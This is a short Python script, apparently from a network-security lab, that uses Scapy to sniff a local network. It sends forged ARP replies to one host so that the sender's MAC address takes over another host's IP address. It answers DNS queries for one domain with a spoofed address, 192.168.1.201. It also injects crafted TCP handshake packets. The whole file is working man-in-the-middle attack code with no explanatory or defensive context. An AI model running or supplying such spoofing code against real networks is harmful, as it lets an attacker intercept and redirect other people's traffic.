#!/usr/bin/python
from scapy.all import *
import uuid

def dnsMonitorCallBack(pkt):
	if pkt.haslayer(ARP) and pkt[ARP].psrc == '192.168.1.5':
		packet = NewPacketARP(pkt)
		send(packet)

	if pkt.haslayer(DNS) and pkt[DNS][DNSQR].qname == b'www.tigerfan.ca.':
		packet = NewPacketDNS(pkt)
		send(packet)

	if pkt.haslayer(TCP):
		packet = sendSynAck(pkt)
		send(packet)


def sendSynAck(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    SYN = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='S', seq=1000)
    SYNACK = sr1(ip / SYN)

    packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
               TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
    return packet

def NewPacketARP(pkt):
	packet = ARP( hwsrc=get_mac(), psrc=pkt[ARP].pdst, hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc, op=2)
	return packet

def NewPacketDNS(pkt):
   packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
            DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype=pkt[DNS][DNSQR].qtype,qclass=pkt[DNS][DNSQR].qclass), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdata="192.168.1.201"))
   return packet

def get_mac():
	return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()

sniff(prn=dnsMonitorCallBack)
